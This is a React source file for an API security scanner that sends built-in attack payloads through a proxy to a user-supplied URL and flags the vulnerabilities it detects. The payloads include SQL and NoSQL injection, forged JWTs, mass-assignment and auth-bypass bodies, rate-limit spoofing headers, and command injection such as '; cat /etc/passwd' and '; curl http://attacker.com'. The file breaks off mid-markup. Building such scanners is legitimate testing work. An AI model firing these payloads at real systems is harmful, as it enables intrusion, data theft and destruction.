"use client"
import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Textarea } from "@/components/ui/textarea"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import {
  Server,
  Play,
  Plus,
  Trash2,
  ArrowLeft,
  AlertTriangle,
  CheckCircle,
  Clock,
  Shield,
  Database,
  Bug,
  Zap,
  Key,
  Globe,
} from "lucide-react"

interface ApiTest {
  id: string
  name: string
  method: "GET" | "POST" | "PUT" | "DELETE" | "PATCH" | "OPTIONS" | "HEAD"
  url: string
  headers: Record<string, string>
  body?: string
  expectedStatus?: number
  testType: "manual" | "automated" | "fuzzing" | "injection"
}

interface ApiTestResult {
  id: string
  testId: string
  testName: string
  url: string
  method: string
  status: "running" | "passed" | "failed" | "error"
  responseTime: number
  statusCode?: number
  responseBody?: string
  responseHeaders?: Record<string, string>
  vulnerabilities: ApiVulnerability[]
  timestamp: Date
  testedPayloads?: number
  totalRequests?: number
}

interface ApiVulnerability {
  id: string
  type:
    | "AUTH_BYPASS"
    | "INJECTION"
    | "SENSITIVE_DATA"
    | "RATE_LIMITING"
    | "CORS"
    | "HEADERS"
    | "IDOR"
    | "MASS_ASSIGNMENT"
    | "JWT_VULN"
    | "GRAPHQL_VULN"
    | "API_ABUSE"
    | "BUSINESS_LOGIC"
  severity: "Critical" | "High" | "Medium" | "Low"
  description: string
  evidence: string
  recommendation: string
  payload?: string
  cwe?: string
}

interface AttackPattern {
  name: string
  category: string
  payloads: string[]
  description: string
  severity: "Critical" | "High" | "Medium" | "Low"
  methods: string[]
}

interface ApiTesterProps {
  onBack: () => void
}

export default function ApiTester({ onBack }: ApiTesterProps) {
  const [tests, setTests] = useState<ApiTest[]>([])
  const [testResults, setTestResults] = useState<ApiTestResult[]>([])
  const [isRunning, setIsRunning] = useState(false)
  const [selectedTest, setSelectedTest] = useState<ApiTest | null>(null)
  const [newTest, setNewTest] = useState<Partial<ApiTest>>({
    name: "",
    method: "GET",
    url: "",
    headers: {},
    body: "",
    testType: "manual",
  })
  const [autoTestEnabled, setAutoTestEnabled] = useState(false)
  const [fuzzingEnabled, setFuzzingEnabled] = useState(false)
  const [selectedAttackCategories, setSelectedAttackCategories] = useState<string[]>(["all"])
  const [maxConcurrentRequests, setMaxConcurrentRequests] = useState("5")
  const [requestDelay, setRequestDelay] = useState("200")

  const apiAttackPatterns: AttackPattern[] = [
    {
      name: "SQL Injection in API Parameters",
      category: "injection",
      description: "SQL injection payloads for API parameters and JSON fields",
      severity: "Critical",
      methods: ["GET", "POST", "PUT", "PATCH"],
      payloads: [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "' OR SLEEP(5)--",
        "' WAITFOR DELAY '00:00:05'--",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('1'='1",
        "' UNION ALL SELECT NULL,NULL,NULL--",
      ],
    },
    {
      name: "NoSQL Injection",
      category: "injection",
      description: "NoSQL injection for MongoDB and other NoSQL databases",
      severity: "High",
      methods: ["POST", "PUT", "PATCH"],
      payloads: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
        '"; return true; var x = "',
        '"; return this.username == "admin"; var x = "',
        'admin"; return true; //',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "function() { return true; }"}',
        '{"$expr": {"$eq": [1, 1]}}',
        '{"username": {"$regex": "^admin"}}',
      ],
    },
    {
      name: "Authentication Bypass",
      category: "auth",
      description: "Authentication and authorization bypass techniques",
      severity: "Critical",
      methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
      payloads: [
        '{"admin": true}',
        '{"role": "admin"}',
        '{"is_admin": true}',
        '{"user_id": 1}',
        '{"permissions": ["admin"]}',
        '{"bypass": true}',
        '{"auth": "bypass"}',
        '{"token": "admin"}',
        '{"user_type": "administrator"}',
        '{"access_level": "admin"}',
        '{"privilege": "admin"}',
        '{"account_type": "admin"}',
      ],
    },
    {
      name: "JWT Vulnerabilities",
      category: "jwt",
      description: "JWT manipulation and bypass techniques",
      severity: "High",
      methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
      payloads: [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJhZG1pbiJ9.signature",
      ],
    },
    {
      name: "Mass Assignment",
      category: "logic",
      description: "Mass assignment vulnerabilities in API endpoints",
      severity: "High",
      methods: ["POST", "PUT", "PATCH"],
      payloads: [
        '{"admin": true, "role": "administrator"}',
        '{"is_admin": true, "permissions": ["all"]}',
        '{"user_type": "admin", "access_level": "full"}',
        '{"role_id": 1, "admin": true}',
        '{"privileges": ["admin"], "is_superuser": true}',
        '{"account_type": "admin", "status": "active"}',
        '{"user_role": "administrator", "verified": true}',
        '{"admin_flag": true, "super_user": true}',
      ],
    },
    {
      name: "IDOR - Insecure Direct Object Reference",
      category: "idor",
      description: "IDOR vulnerabilities in API endpoints",
      severity: "Medium",
      methods: ["GET", "PUT", "DELETE", "PATCH"],
      payloads: [
        "1",
        "2",
        "3",
        "0",
        "-1",
        "999999",
        "admin",
        "administrator",
        "root",
        "test",
        "../1",
        "../../2",
        "../admin",
        "1'",
        '1"',
        "1;",
        "1|",
        "user1",
        "user2",
        "user999",
        "00000001",
        "00000002",
      ],
    },
    {
      name: "GraphQL Injection",
      category: "graphql",
      description: "GraphQL injection and introspection attacks",
      severity: "Medium",
      methods: ["POST"],
      payloads: [
        "query { __schema { types { name } } }",
        'query { __type(name: "User") { fields { name type { name } } } }',
        'mutation { deleteUser(id: "1") { id } }',
        "query { users(first: 1000000) { id email password } }",
        "query { user(id: \"1' OR '1'='1\") { id } }",
        "query { users { ...on User { id email } ...on Admin { id email password } } }",
        "query { __schema { mutationType { fields { name } } } }",
        "query { __schema { subscriptionType { fields { name } } } }",
      ],
    },
    {
      name: "API Rate Limiting Bypass",
      category: "abuse",
      description: "Rate limiting and API abuse techniques",
      severity: "Medium",
      methods: ["GET", "POST", "PUT", "DELETE"],
      payloads: [
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 192.168.1.1",
        "X-Originating-IP: 10.0.0.1",
        "X-Remote-IP: 172.16.0.1",
        "X-Client-IP: 203.0.113.1",
        "CF-Connecting-IP: 198.51.100.1",
        "True-Client-IP: 192.0.2.1",
        "X-Cluster-Client-IP: 127.0.0.1",
      ],
    },
    {
      name: "Business Logic Flaws",
      category: "logic",
      description: "Business logic bypass and manipulation",
      severity: "High",
      methods: ["POST", "PUT", "PATCH"],
      payloads: [
        '{"price": -1}',
        '{"quantity": -1}',
        '{"discount": 100}',
        '{"amount": 0.01}',
        '{"balance": 999999}',
        '{"credits": -1}',
        '{"points": 999999}',
        '{"limit": 0}',
        '{"max_attempts": 0}',
        '{"timeout": 0}',
      ],
    },
    {
      name: "Command Injection in APIs",
      category: "injection",
      description: "OS command injection through API parameters",
      severity: "Critical",
      methods: ["POST", "PUT", "PATCH"],
      payloads: [
        "; id",
        "| id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| whoami",
        "&& uname -a",
        "; ls -la",
        "| ps aux",
        "&& netstat -an",
        "; curl http://attacker.com",
      ],
    },
  ]

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "Critical":
        return "bg-red-600 text-white"
      case "High":
        return "bg-red-500 text-white"
      case "Medium":
        return "bg-yellow-500 text-black"
      case "Low":
        return "bg-blue-500 text-white"
      default:
        return "bg-muted text-muted-foreground"
    }
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case "passed":
        return "bg-primary text-primary-foreground"
      case "failed":
        return "bg-destructive text-destructive-foreground"
      case "running":
        return "bg-accent text-accent-foreground"
      case "error":
        return "bg-red-600 text-white"
      default:
        return "bg-muted text-muted-foreground"
    }
  }

  const getVulnerabilityIcon = (type: string) => {
    switch (type) {
      case "INJECTION":
        return <Database className="h-4 w-4" />
      case "AUTH_BYPASS":
        return <Key className="h-4 w-4" />
      case "IDOR":
        return <Shield className="h-4 w-4" />
      case "MASS_ASSIGNMENT":
        return <Bug className="h-4 w-4" />
      case "JWT_VULN":
        return <Key className="h-4 w-4" />
      case "GRAPHQL_VULN":
        return <Globe className="h-4 w-4" />
      case "API_ABUSE":
        return <Zap className="h-4 w-4" />
      default:
        return <AlertTriangle className="h-4 w-4" />
    }
  }

  const performRealApiTest = async (test: ApiTest): Promise<ApiTestResult> => {
    const startTime = Date.now()
    let testedPayloads = 0
    let totalRequests = 0
    const vulnerabilities: ApiVulnerability[] = []

    try {
      console.log(`[v0] Starting real API security test for: ${test.url}`)

      // Basic endpoint test
      const basicResponse = await fetch("/api/proxy/content", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: test.url,
          method: test.method,
          headers: test.headers,
          body: test.body,
        }),
      })

      totalRequests++
      let statusCode = 0
      let responseBody = ""
      let responseHeaders = {}

      if (basicResponse.ok) {
        const result = await basicResponse.json()
        statusCode = result.status || 200
        responseBody = result.content || ""
        responseHeaders = result.headers || {}

        // Check for security headers
        const securityVulns = checkApiSecurityHeaders(responseHeaders, test.url)
        vulnerabilities.push(...securityVulns)
      }

      // Automated security testing if enabled
      if (autoTestEnabled || test.testType === "automated") {
        const selectedCategories = selectedAttackCategories.includes("all")
          ? apiAttackPatterns.map((p) => p.category)
          : selectedAttackCategories

        const patternsToTest = apiAttackPatterns.filter(
          (p) => selectedCategories.includes(p.category) && p.methods.includes(test.method),
        )

        for (const pattern of patternsToTest) {
          for (const payload of pattern.payloads) {
            try {
              let testUrl = test.url
              let testBody = test.body
              const testHeaders = { ...test.headers }

              // Apply payload based on method and pattern
              if (test.method === "GET") {
                testUrl = `${test.url}${test.url.includes("?") ? "&" : "?"}param=${encodeURIComponent(payload)}`
              } else if (pattern.category === "jwt") {
                testHeaders["Authorization"] = `Bearer ${payload}`
              } else if (pattern.category === "abuse") {
                const headerParts = payload.split(": ")
                if (headerParts.length === 2) {
                  testHeaders[headerParts[0]] = headerParts[1]
                }
              } else {
                // JSON body injection
                try {
                  const bodyObj = testBody ? JSON.parse(testBody) : {}
                  if (pattern.category === "injection") {
                    bodyObj.test_param = payload
                  } else if (pattern.category === "auth" || pattern.category === "logic") {
                    const payloadObj = JSON.parse(payload)
                    Object.assign(bodyObj, payloadObj)
                  }
                  testBody = JSON.stringify(bodyObj)
                } catch {
                  testBody = payload
                }
              }

              const response = await fetch("/api/proxy/content", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  url: testUrl,
                  method: test.method,
                  headers: testHeaders,
                  body: testBody,
                }),
              })

              totalRequests++
              testedPayloads++

              if (response.ok) {
                const result = await response.json()
                const content = result.content || ""
                const headers = result.headers || {}
                const status = result.status || 200

                // Detect vulnerabilities based on response
                const vuln = detectApiVulnerability(payload, content, headers, status, test.url, pattern)
                if (vuln) {
                  vulnerabilities.push(vuln)
                }
              }

              // Rate limiting
              const delay = Number.parseInt(requestDelay)
              if (delay > 0) {
                await new Promise((resolve) => setTimeout(resolve, delay))
              }
            } catch (error) {
              console.log(`[v0] Error testing payload ${payload}:`, error)
            }
          }
        }
      }

      // IDOR testing for specific endpoints
      if (test.url.match(/\/\d+$/) || test.url.includes("/user/") || test.url.includes("/admin/")) {
        const idorVulns = await testIdorVulnerability(test)
        vulnerabilities.push(...idorVulns)
        totalRequests += 10 // Approximate IDOR test requests
      }

      const responseTime = Date.now() - startTime
      const status = statusCode >= 200 && statusCode < 300 ? "passed" : statusCode >= 400 ? "failed" : "error"

      return {
        id: Date.now().toString(),
        testId: test.id,
        testName: test.name,
        url: test.url,
        method: test.method,
        status,
        responseTime,
        statusCode,
        responseBody: responseBody.substring(0, 2000), // Limit response size
        responseHeaders,
        vulnerabilities,
        timestamp: new Date(),
        testedPayloads,
        totalRequests,
      }
    } catch (error) {
      console.error(`[v0] API test failed for ${test.url}:`, error)
      return {
        id: Date.now().toString(),
        testId: test.id,
        testName: test.name,
        url: test.url,
        method: test.method,
        status: "error",
        responseTime: Date.now() - startTime,
        vulnerabilities: [],
        timestamp: new Date(),
        testedPayloads,
        totalRequests,
      }
    }
  }

  const detectApiVulnerability = (
    payload: string,
    response: string,
    headers: any,
    statusCode: number,
    url: string,
    pattern: AttackPattern,
  ): ApiVulnerability | null => {
    // SQL Injection Detection
    if (pattern.category === "injection" && payload.includes("'")) {
      const sqlErrors = [
        "mysql_fetch_array",
        "ORA-01756",
        "Microsoft OLE DB Provider",
        "PostgreSQL query failed",
        "Warning: mysql_",
        "MySQLSyntaxErrorException",
        "SQL syntax.*MySQL",
        "PostgreSQL.*ERROR",
        "PG::SyntaxError:",
        "org\\.postgresql\\.util\\.PSQLException",
      ]

      for (const error of sqlErrors) {
        if (new RegExp(error, "i").test(response)) {
          return {
            id: `sqli-${Date.now()}-${Math.random()}`,
            type: "INJECTION",
            severity: "Critical",
            description: "SQL Injection vulnerability detected in API endpoint",
            evidence: `SQL Error: ${error}, Payload: ${payload}`,
            recommendation: "Use parameterized queries and input validation",
            payload,
            cwe: "CWE-89",
          }
        }
      }
    }

    // Authentication Bypass Detection
    if (pattern.category === "auth") {
      if (statusCode === 200 && (response.includes("admin") || response.includes("success"))) {
        return {
          id: `auth-${Date.now()}-${Math.random()}`,
          type: "AUTH_BYPASS",
          severity: "Critical",
          description: "Authentication bypass vulnerability detected",
          evidence: `Successful response with auth bypass payload: ${payload}`,
          recommendation: "Implement proper authentication and authorization checks",
          payload,
          cwe: "CWE-287",
        }
      }
    }

    // JWT Vulnerability Detection
    if (pattern.category === "jwt") {
      if (statusCode === 200 && !payload.includes("invalid_signature")) {
        return {
          id: `jwt-${Date.now()}-${Math.random()}`,
          type: "JWT_VULN",
          severity: "High",
          description: "JWT vulnerability detected - token validation bypass",
          evidence: `JWT bypass successful with payload: ${payload}`,
          recommendation: "Implement proper JWT signature validation",
          payload,
          cwe: "CWE-347",
        }
      }
    }

    // Mass Assignment Detection
    if (pattern.category === "logic" && payload.includes("admin")) {
      if (statusCode === 200 && (response.includes("admin") || response.includes("role"))) {
        return {
          id: `mass-${Date.now()}-${Math.random()}`,
          type: "MASS_ASSIGNMENT",
          severity: "High",
          description: "Mass assignment vulnerability detected",
          evidence: `Privilege escalation via mass assignment: ${payload}`,
          recommendation: "Implement proper input filtering and whitelist allowed fields",
          payload,
          cwe: "CWE-915",
        }
      }
    }

    // Business Logic Flaw Detection
    if (pattern.category === "logic" && (payload.includes("-1") || payload.includes("999999"))) {
      if (statusCode === 200) {
        return {
          id: `logic-${Date.now()}-${Math.random()}`,
          type: "BUSINESS_LOGIC",
          severity: "High",
          description: "Business logic flaw detected",
          evidence: `Business logic bypass with payload: ${payload}`,
          recommendation: "Implement proper business logic validation",
          payload,
          cwe: "CWE-840",
        }
      }
    }

    // Command Injection Detection
    if (pattern.category === "injection" && (payload.includes(";") || payload.includes("|"))) {
      const commandOutputs = ["uid=", "gid=", "root:", "bin:", "Windows IP Configuration"]

      for (const output of commandOutputs) {
        if (response.includes(output)) {
          return {
            id: `cmdi-${Date.now()}-${Math.random()}`,
            type: "INJECTION",
            severity: "Critical",
            description: "Command injection vulnerability detected",
            evidence: `Command output detected: ${output}, Payload: ${payload}`,
            recommendation: "Avoid system calls with user input or use proper input validation",
            payload,
            cwe: "CWE-78",
          }
        }
      }
    }

    return null
  }

  const testIdorVulnerability = async (test: ApiTest): Promise<ApiVulnerability[]> => {
    const vulnerabilities: ApiVulnerability[] = []
    const idorPayloads = ["1", "2", "3", "0", "-1", "999999", "admin", "test"]

    for (const payload of idorPayloads) {
      try {
        const testUrl = test.url.replace(/\/\d+$/, `/${payload}`)

        const response = await fetch("/api/proxy/content", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            url: testUrl,
            method: test.method,
            headers: test.headers,
          }),
        })

        if (response.ok) {
          const result = await response.json()
          const statusCode = result.status || 200
          const content = result.content || ""

          if (statusCode === 200 && content.length > 0) {
            vulnerabilities.push({
              id: `idor-${Date.now()}-${Math.random()}`,
              type: "IDOR",
              severity: "Medium",
              description: "Insecure Direct Object Reference vulnerability detected",
              evidence: `Unauthorized access to resource with ID: ${payload}`,
              recommendation: "Implement proper authorization checks for object access",
              payload,
              cwe: "CWE-639",
            })
          }
        }
      } catch (error) {
        console.log(`[v0] IDOR test failed for payload ${payload}:`, error)
      }
    }

    return vulnerabilities
  }

  const checkApiSecurityHeaders = (headers: any, url: string): ApiVulnerability[] => {
    const vulnerabilities: ApiVulnerability[] = []
    const headerKeys = Object.keys(headers).map((h) => h.toLowerCase())

    // Check for missing security headers
    const requiredHeaders = [
      "x-content-type-options",
      "x-frame-options",
      "strict-transport-security",
      "content-security-policy",
    ]

    for (const header of requiredHeaders) {
      if (!headerKeys.includes(header)) {
        vulnerabilities.push({
          id: `header-${header}-${Date.now()}`,
          type: "HEADERS",
          severity: "Medium",
          description: `Missing security header: ${header}`,
          evidence: `Header ${header} not found in API response`,
          recommendation: `Add ${header} header to improve API security`,
          cwe: "CWE-693",
        })
      }
    }

    // Check for CORS misconfigurations
    const corsHeader = headers["access-control-allow-origin"]
    if (corsHeader === "*") {
      vulnerabilities.push({
        id: `cors-${Date.now()}`,
        type: "CORS",
        severity: "Medium",
        description: "Overly permissive CORS policy detected",
        evidence: "Access-Control-Allow-Origin: * allows any origin",
        recommendation: "Restrict CORS to specific trusted origins",
        cwe: "CWE-942",
      })
    }

    return vulnerabilities
  }

  const runSingleTest = async (test: ApiTest) => {
    setIsRunning(true)

    // Add running result
    const runningResult: ApiTestResult = {
      id: Date.now().toString(),
      testId: test.id,
      testName: test.name,
      url: test.url,
      method: test.method,
      status: "running",
      responseTime: 0,
      vulnerabilities: [],
      timestamp: new Date(),
      testedPayloads: 0,
      totalRequests: 0,
    }

    setTestResults((prev) => [runningResult, ...prev])

    try {
      const result = await performRealApiTest(test)
      setTestResults((prev) => prev.map((r) => (r.id === runningResult.id ? result : r)))
    } catch (error) {
      setTestResults((prev) => prev.map((r) => (r.id === runningResult.id ? { ...r, status: "error" as const } : r)))
    }

    setIsRunning(false)
  }

  const runAllTests = async () => {
    setIsRunning(true)
    for (const test of tests) {
      await runSingleTest(test)
    }
    setIsRunning(false)
  }

  const addNewTest = () => {
    if (!newTest.name || !newTest.url) return

    const test: ApiTest = {
      id: Date.now().toString(),
      name: newTest.name,
      method: newTest.method || "GET",
      url: newTest.url,
      headers: newTest.headers || {},
      body: newTest.body,
      expectedStatus: newTest.expectedStatus,
      testType: newTest.testType || "manual",
    }

    setTests((prev) => [...prev, test])
    setNewTest({ name: "", method: "GET", url: "", headers: {}, body: "", testType: "manual" })
  }

  const deleteTest = (testId: string) => {
    setTests((prev) => prev.filter((t) => t.id !== testId))
  }

  const totalVulnerabilities = testResults.reduce((sum, result) => sum + result.vulnerabilities.length, 0)
  const passedTests = testResults.filter((r) => r.status === "passed").length
  const failedTests = testResults.filter((r) => r.status === "failed").length

  return (
    <div className="min-h-screen bg-background text-foreground p-4 md:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center gap-4">
          <Button variant="outline" size="sm" onClick={onBack}>
            <ArrowLeft className="h-4 w-4 mr-2" />
            Back to Dashboard
          </Button>
          <div>
            <h1 className="text-3xl font-bold text-balance flex items-center gap-3">
              <Server className="h-8 w-8" />
              Advanced API Security Tester 2025
            </h1>
            <p className="text-muted-foreground text-pretty">
              Comprehensive API security testing with real attack patterns and vulnerability detection
            </p>
          </div>
        </div>

        {/* Configuration Panel */}
        <Card>
          <CardHeader>
            <CardTitle>Security Testing Configuration</CardTitle>
            <CardDescription>Configure automated API security testing parameters</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  id="auto-test-enabled"
                  checked={autoTestEnabled}
                  onChange={(e) => setAutoTestEnabled(e.target.checked)}
                  disabled={isRunning}
                />
                <label htmlFor="auto-test-enabled" className="text-sm font-medium">
                  Enable Automated Security Testing
                </label>
              </div>
              <div className="flex items-center space-x-2">
                <input
                  type="checkbox"
                  id="fuzzing-enabled"
                  checked={fuzzingEnabled}
                  onChange={(e) => setFuzzingEnabled(e.target.checked)}
                  disabled={isRunning}
                />
                <label htmlFor="fuzzing-enabled" className="text-sm font-medium">
                  Enable API Fuzzing
                </label>
              </div>
            </div>

            {autoTestEnabled && (
              <div className="space-y-4 border-t pt-4">
                <h3 className="text-lg font-medium">Attack Categories</h3>
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
                  <div className="flex items-center space-x-2">
                    <input
                      type="checkbox"
                      id="all-categories"
                      checked={selectedAttackCategories.includes("all")}
                      onChange={(e) => {
                        if (e.target.checked) {
                          setSelectedAttackCategories(["all"])
                        } else {
                          setSelectedAttackCategories([])
                        }
                      }}
                      disabled={isRunning}
                    />
                    <label htmlFor="all-categories" className="text-sm font-medium">
                      All Categories
                    </label>
                  </div>
                  {Array.from(new Set(apiAttackPatterns.map((p) => p.category))).map((category) => (
                    <div key={category} className="flex items-center space-x-2">
                      <input
                        type="checkbox"
                        id={category}
                        checked={
                          selectedAttackCategories.includes(category) || selectedAttackCategories.includes("all")
                        }
                        onChange={(e) => {
                          if (e.target.checked) {
                            setSelectedAttackCategories((prev) =>
                              prev.includes("all") ? [category] : [...prev.filter((c) => c !== "all"), category],
                            )
                          } else {
                            setSelectedAttackCategories((prev) => prev.filter((c) => c !== category && c !== "all"))
                          }
                        }}
                        disabled={isRunning || selectedAttackCategories.includes("all")}
                      />
                      <label htmlFor={category} className="text-sm capitalize">
                        {category}
                      </label>
                    </div>
                  ))}
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-sm font-medium">Max Concurrent Requests</label>
                    <Input
                      type="number"
                      min="1"
                      max="20"
                      value={maxConcurrentRequests}
                      onChange={(e) => setMaxConcurrentRequests(e.target.value)}
                      disabled={isRunning}
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-sm font-medium">Request Delay (ms)</label>
                    <Input
                      type="number"
                      min="0"
                      max="5000"
                      value={requestDelay}
                      onChange={(e) => setRequestDelay(e.target.value)}
                      disabled={isRunning}
                    />
                  </div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Attack Patterns Overview */}
        <Card>
          <CardHeader>
            <CardTitle>API Attack Patterns ({apiAttackPatterns.length})</CardTitle>
            <CardDescription>Modern API security testing patterns for 2025</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {apiAttackPatterns.map((pattern) => (
                <Card key={pattern.name} className="border-l-4 border-l-primary">
                  <CardContent className="p-4">
                    <div className="flex items-start gap-3">
                      {getVulnerabilityIcon(pattern.category.toUpperCase())}
                      <div className="space-y-1">
                        <div className="font-medium text-sm">{pattern.name}</div>
                        <p className="text-xs text-muted-foreground">{pattern.description}</p>
                        <div className="flex items-center gap-2">
                          <Badge className={getSeverityColor(pattern.severity)} variant="secondary">
                            {pattern.severity}
                          </Badge>
                          <span className="text-xs text-muted-foreground">{pattern.payloads.length} payloads</span>
                        </div>
                        <div className="text-xs text-muted-foreground">Methods: {pattern.methods.join(", ")}</div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Statistics */}
        {testResults.length > 0 && (
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Total Tests</p>
                    <p className="text-2xl font-bold">{testResults.length}</p>
                  </div>
                  <Server className="h-8 w-8 text-foreground" />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Vulnerabilities</p>
                    <p className="text-2xl font-bold text-destructive">{totalVulnerabilities}</p>
                  </div>
                  <AlertTriangle className="h-8 w-8 text-destructive" />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Passed</p>
                    <p className="text-2xl font-bold text-primary">{passedTests}</p>
                  </div>
                  <CheckCircle className="h-8 w-8 text-primary" />
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardContent className="p-4">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-muted-foreground">Failed</p>
                    <p className="text-2xl font-bold text-destructive">{failedTests}</p>
                  </div>
                  <AlertTriangle className="h-8 w-8 text-destructive" />
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Test Configuration */}
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle>API Tests</CardTitle>
                  <CardDescription>Configure and manage your API endpoint tests</CardDescription>
                </div>
                <Button onClick={runAllTests} disabled={isRunning || tests.length === 0}>
                  <Play className="h-4 w-4 mr-2" />
                  Run All Tests
                </Button>
              </div>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-[400px]">
                <div className="space-y-4">
                  {tests.map((test) => (
                    <Card key={test.id} className="border-l-4 border-l-primary">
                      <CardContent className="p-4">
                        <div className="flex items-start justify-between mb-2">
                          <div>
                            <h4 className="font-medium">{test.name}</h4>
                            <div className="flex items-center gap-2 mt-1">
                              <Badge variant="outline">{test.method}</Badge>
                              <Badge variant="secondary">{test.testType}</Badge>
                              <span className="text-sm text-muted-foreground truncate">{test.url}</span>
                            </div>
                          </div>
                          <div className="flex gap-1">
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => runSingleTest(test)}
                              disabled={isRunning}
                            >
                              <Play className="h-3 w-3" />
                            </Button>
                            <Button size="sm" variant="outline" onClick={() => deleteTest(test.id)}>
                              <Trash2 className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                        {Object.keys(test.headers).length > 0 && (
                          <div className="text-xs text-muted-foreground">
                            Headers: {Object.keys(test.headers).join(", ")}
                          </div>
                        )}
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </ScrollArea>

              {/* Add New Test */}
              <div className="mt-4 pt-4 border-t space-y-4">
                <h4 className="font-medium">Add New Test</h4>
                <div className="grid grid-cols-2 gap-2">
                  <Input
                    placeholder="Test name"
                    value={newTest.name || ""}
                    onChange={(e) => setNewTest((prev) => ({ ...prev, name: e.target.value }))}
                  />
                  <Select
                    value={newTest.method}
                    onValueChange={(value) => setNewTest((prev) => ({ ...prev, method: value as any }))}
                  >
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="GET">GET</SelectItem>
                      <SelectItem value="POST">POST</SelectItem>
                      <SelectItem value="PUT">PUT</SelectItem>
                      <SelectItem value="DELETE">DELETE</SelectItem>
                      <SelectItem value="PATCH">PATCH</SelectItem>
                      <SelectItem value="OPTIONS">OPTIONS</SelectItem>
                      <SelectItem value="HEAD">HEAD</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <Input
                  placeholder="Enter API endpoint URL"
                  value={newTest.url || ""}
                  onChange={(e) => setNewTest((prev) => ({ ...prev, url: e.target.value }))}
                />
                <Select
                  value={newTest.testType}
                  onValueChange={(value) => setNewTest((prev) => ({ ...prev, testType: value as any }))}
                >
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="manual">Manual Test</SelectItem>
                    <SelectItem value="automated">Automated Security Test</SelectItem>
                    <SelectItem value="fuzzing">Fuzzing Test</SelectItem>
                    <SelectItem value="injection">Injection Test</SelectItem>
                  </SelectContent>
                </Select>
                <Textarea
                  placeholder="Request body (JSON)"
                  value={newTest.body || ""}
                  onChange={(e) => setNewTest((prev) => ({ ...prev, body: e.target.value }))}
                  rows={3}
                />
                <Button onClick={addNewTest} className="w-full">
                  <Plus className="h-4 w-4 mr-2" />
                  Add Test
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Test Results */}
          <Card>
            <CardHeader>
              <CardTitle>Test Results</CardTitle>
              <CardDescription>Real API security test results and vulnerabilities</CardDescription>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-[600px]">
                <div className="space-y-4">
